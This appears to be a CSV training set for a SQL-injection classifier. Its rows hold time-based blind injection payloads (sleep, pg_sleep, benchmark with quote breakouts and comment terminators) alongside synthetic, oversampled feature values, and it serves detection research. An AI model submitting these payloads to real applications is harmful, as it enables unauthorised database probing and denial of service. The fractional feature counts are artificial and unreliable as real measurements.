id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001570,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000110,1.1366487835170624,78.70377948362564,19.450629913937608,2.942185663553023,27.0,2.0,39.80251965575043,9.901259827875215,0.3435490940215192,0.02544808103863104,0.5054954867553367,0.1255073381845131,0.45062991393760754,0.0,0.0,0.0,1.0,0.0,0.0,8.450629913937608,0.0,0.0,0.0,1.0,0.45062991393760765,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001571,attack,time,"1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000149,2.0211892876528625,90.68532117623317,26.462935764753365,3.7534531983405035,23.85174305901346,24.22238541147981,32.148256940986535,10.462935764753366,0.26382392944906186,0.2663951822469851,0.3541650752101442,0.1156158130938088,2.388807294260097,0.0,0.0,0.0,0.0,2.0,0.0,4.537064235246635,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.5370642352466344,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.5370642352466344,0.0,0.4629357647533656,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001572,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000147,1.1282228209674656,72.68743073008122,25.656284634959388,3.606889962191591,15.687430730081223,20.31256926991878,28.0,8.687430730081221,0.21568760353127436,0.2796675942384471,0.3852762649320056,0.11936853729827293,1.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.343715365040611,0.0,1.0,1.0,1.0,0.0,0.0,0.34371536504061106,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001573,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000103,0.14016304717359324,84.53396385963232,19.123222429145923,2.8893503256790285,27.04107414304864,2.0,43.41074143048641,12.082148286097281,0.32008262196931925,0.023678457570046052,0.5133212854929636,0.14291763496767104,0.0,1.0,0.0,0.0,1.0,0.0,0.0,9.082148286097281,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.041074143048640654,0.9589258569513595,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001574,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000075,2.3129723276599106,85.45625100210133,27.877206000247217,3.6430294245697556,27.263236001483293,10.0,35.631618000741646,12.561396999876392,0.31531644886227633,0.11814271119824381,0.41757218906727456,0.14896865087220532,4.0,0.0,0.0,0.0,0.0,1.5613969998763924,0.0,4.877206000247215,1.1227939997527847,1.0,0.0,1.5613969998763924,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001575,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pbin'  =  'pbin",nearest_attack_euclidean,R000053,0.028813956123003175,88.98878357575991,27.988783575759907,3.8867058148541416,26.0,21.988783575759907,30.0,11.0,0.2921720667811852,0.24709505867925355,0.3371216155167521,0.12361125902280912,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.9887835757599064,0.011216424240093614,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001576,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000009,1.1583773641185033,91.24694673759272,22.0,3.163530702908564,32.98778695037088,1.0,43.506106524814555,13.75305326240728,0.3611094585604811,0.010960513679034695,0.47707609146184116,0.15085393629864302,3.0,0.0,0.0,0.0,1.0,1.0,0.0,8.376526631203639,0.3765266312036396,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001577,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000019,1.3612826689798518,63.30655646962853,22.693443530371464,3.453547753700571,19.0,10.0,27.0,7.306556469628534,0.30014271504887347,0.1579698500257229,0.4265185950694518,0.11536883985595187,0.0,0.6934435303714659,0.6131129392570682,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.6131129392570682,0.0,0.6934435303714659,0.3065564696285341,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001578,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000019,0.6527312427597374,63.51396673963518,22.74301663018241,3.43443645858099,19.0,10.0,27.513966739635183,7.0,0.299202596324037,0.15747505069686157,0.43308981749129827,0.11023253548780311,0.0,0.7430166301824089,0.0,0.0,0.0,1.0,0.0,4.256983369817592,0.0,1.0,0.0,1.0,0.0,0.743016630182409,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001579,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000129,1.1042044192133662,65.0,24.002051862082112,3.435548115191842,19.0,10.0,28.0,8.0,0.2923076923076923,0.15384615384615385,0.4307692307692308,0.12307692307692308,0.6673506206940377,0.33264937930596217,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,0.6673506206940377,0.33264937930596217,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001580,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000038,0.24594456477433452,58.87850193321983,21.21962548330496,3.3459195875978653,15.054906370826242,10.439250966609915,25.274531854131197,8.10981274165248,0.25629241391184165,0.17630278115824252,0.42962728313353066,0.13777752179638517,0.05490637082623939,0.0,2.0,0.0,0.0,1.0549063708262394,0.0,4.0,0.0,0.0,1.0,3.05490637082624,0.05490637082623956,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.05490637082623939,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0549063708262394
SMOTE_001581,attack,time,1  )   as eryo where 2531  =  2531 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000083,1.5963561084896396,58.12982199685406,22.305267004718903,3.568567639087128,19.694732995281097,10.0,22.0,6.435089001572968,0.3384665432017988,0.17207903063677055,0.3785738674008952,0.11088055876053544,0.0,0.4350890015729677,2.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.0,0.0,0.4350890015729678,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.4350890015729677,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4350890015729676
SMOTE_001582,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R000119,0.5909557930325497,64.0,22.184043308353832,3.3764853473425833,18.0,10.0,28.0,8.0,0.28125,0.15625,0.4375,0.125,0.18404330835383198,0.8159566916461679,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,0.1840433083538321,0.815956691646168,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001583,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000129,1.0124516504410332,63.291960856787185,23.861307237858124,3.487865395529411,19.569346381070936,10.0,26.29196085678719,7.430653618929063,0.31041988487370387,0.15829997169025506,0.4142901047460563,0.11699003868998478,0.7153268094645314,0.0,2.0,0.0,0.0,1.0,0.0,3.715326809464531,0.0,0.0,0.0,3.0,0.7153268094645313,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.7153268094645314,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7153268094645315
SMOTE_001584,attack,time,"select sleep  (  5  )   and    (    (   ""vzye""  =  ""vzye",nearest_attack_euclidean,R000032,1.369646726976237,56.313959824460746,17.656979912230373,3.144693934076676,22.343020087769627,1.3430200877696272,24.627919648921495,8.0,0.3970159581705685,0.023999421109540023,0.4368830827918806,0.14210153792801083,0.0,3.3430200877696263,0.0,0.0,0.0,0.6569799122303737,0.0,4.0,0.0,0.0,0.0,0.6569799122303737,0.0,1.0,0.0,0.0,0.0,0.6569799122303737,1.0,0.0,0.0,0.0,0.0,0.6569799122303737,0.0,0.0,0.0,1.3430200877696263,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001585,attack,time,select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,nearest_attack_euclidean,R000049,0.0,59.0,19.0,3.2663537739235613,24.0,1.0,25.0,9.0,0.4067796610169492,0.016949152542372878,0.423728813559322,0.15254237288135594,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001586,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000079,0.4374572863033571,65.93473796491071,24.263827904306005,3.4894899988995745,21.319139521530026,10.0,27.35177053907467,7.2638279043060034,0.3208085338080864,0.15273485108119422,0.41647445302474384,0.10998216208597555,0.0,1.2638279043060048,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0879426347686683,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0879426347686683
SMOTE_001587,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000041,0.17127732799499965,68.84923945171177,25.89949296780785,3.659371858252114,22.798985935615693,10.0,27.949746483903922,8.100507032192153,0.33104908260169347,0.1452585870625565,0.4059626268646116,0.11772970347113842,0.05025351609607642,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.050253516096076506,1.0,0.0,3.0,0.050253516096076534,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001588,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000055,0.39655719974507236,65.53972417448992,23.40479313086744,3.51656136942307,19.53972417448992,10.0,27.13493104362248,8.86506895637752,0.2978433248665633,0.15264275546379058,0.41409096212357493,0.13542295754607125,0.0,0.86506895637752,2.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,3.0,0.0,0.86506895637752,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001589,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000052,0.6298370951312385,85.88242319206527,27.441211596032634,3.699959851260931,24.14707053201088,18.0,33.58828212804351,10.147070532010877,0.28123113621349166,0.20971123239079834,0.39093523148617254,0.11812239990953742,0.14707053201087805,0.852929467989122,2.0,0.0,0.0,2.0,0.0,4.147070532010878,0.0,1.0,0.0,4.0,0.14707053201087822,0.852929467989122,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.14707053201087816,0.852929467989122,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001590,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000071,0.2982226494779089,82.8068472797507,19.701711819937675,2.9346994369730437,29.502853033229457,1.900570606645891,41.40342363987535,10.0,0.35615645443101085,0.02282312109767748,0.5,0.12102042447131167,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.900570606645891,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.09942939335410864,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001591,attack,time,1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000101,0.4179191197642136,85.97968494788377,28.32656164929459,3.688735163277134,25.0,18.0,33.65312329858918,9.32656164929459,0.2909512445123343,0.20948489604888068,0.39123282186165687,0.10833103757712816,0.1632808246472952,0.0,2.0,0.0,0.0,2.0,0.0,4.163280824647295,0.0,1.0,0.0,4.0,0.16328082464729515,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001592,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000011,0.4904766919533851,80.52085066197745,26.0,3.299240336370524,20.0,10.0,38.95834760398142,11.56250305799602,0.25001514909829337,0.12500757454914668,0.48159692843909874,0.14338034791346116,1.0,0.0,2.0,0.0,0.0,1.0,0.0,6.562503057996019,0.0,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001593,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000103,0.5457647091877602,84.0,19.0,2.8928105783111304,27.0,2.0,43.0,12.0,0.32142857142857145,0.023809523809523808,0.5119047619047619,0.14285714285714285,0.17061256428075522,0.8293874357192448,0.0,0.0,1.0,0.0,0.0,9.0,0.0,0.0,0.0,1.0,0.17061256428075522,0.8293874357192448,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001594,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R000138,0.9501239707803326,61.37515711452437,18.729192852420727,3.1485045651351586,24.916771409682912,1.0,27.458385704841454,8.0,0.4054587897054831,0.016325492310073964,0.4476117795038511,0.13060393848059176,0.0,3.0,0.0,0.0,0.0,0.2708071475792724,0.0,4.729192852420728,0.0,0.0,0.0,0.27080714757927216,0.0,1.0,0.0,0.0,0.0,0.27080714757927227,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001595,attack,time,"1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000155,0.5178762410332424,75.32315746269353,24.879712957936952,3.5696003884737393,17.0,19.0,29.202870420630475,10.120287042063048,0.22615362847920673,0.2527599377120545,0.3866397459731696,0.1344466878355692,0.8797129579369521,0.12028704206304774,0.0,0.0,0.0,1.0,0.0,5.240574084126096,0.8797129579369523,0.0,1.0,1.0,0.8797129579369521,0.12028704206304769,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001596,attack,time,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",nearest_attack_euclidean,R000030,0.013377776056360773,62.057023020002504,19.0,3.2062958606079115,26.0,1.0,27.0570230200025,8.0,0.41897526919609196,0.016114433430618913,0.4359948299283378,0.12891546744495136,0.0,3.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001597,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy'  =  'hwjy,nearest_attack_euclidean,R000047,1.182179710385012,77.53970977555669,18.46029022444331,2.674814078684089,18.53970977555669,2.0,44.0,13.0,0.2390680780482592,0.02579430243904207,0.5674746536589254,0.16766296585377338,4.0,0.0,0.0,0.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.539709775556691,0.4602902244433087,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001598,attack,time,1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,nearest_attack_euclidean,R000073,0.2464042689181447,62.08745826010799,24.349833040431957,3.768710798553592,22.08745826010799,10.0,21.0,9.0,0.355734339581239,0.16106641510469025,0.33823947171984947,0.14495977359422124,3.0,0.0,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.08745826010798952,0.9125417398920104,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001599,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  '%'  =  ',nearest_attack_euclidean,R000028,0.9371183200051572,90.85047415128484,22.21261853782121,3.023630348073006,28.0,2.700948302569686,46.0,14.149525848715157,0.30829630304539296,0.029105776959809343,0.5064867835745741,0.15611113642022356,2.362144386536367,0.0,0.0,0.0,1.0,1.0,0.0,9.0,0.7873814621787891,0.0,0.0,2.0,0.787381462178789,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001600,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,0.6092859159728363,69.07967901437827,26.0,3.562395023863164,20.0,10.0,29.53620624713504,9.543472767243223,0.2917864950186993,0.14589324750934965,0.4244684700479554,0.13785178742399568,1.0,0.0,2.0,0.0,0.0,1.0,0.0,4.543472767243223,0.0,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001601,attack,time,1 where 1568  =  1568 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000106,0.7460863521057817,96.07022490654919,22.448635687585483,3.2080994673713605,31.310794609481853,8.897271375170963,44.72431784379274,11.13784107810363,0.32582734143824676,0.091257330624546,0.46645080513811654,0.1164645227990907,0.13784107810362944,0.0,0.0,0.0,1.0,0.8621589218963704,0.0,8.13784107810363,0.0,0.0,0.0,1.8621589218963706,0.1378410781036295,0.0,0.0,1.0,0.0,0.8621589218963704,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.8621589218963704,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.862158921896371
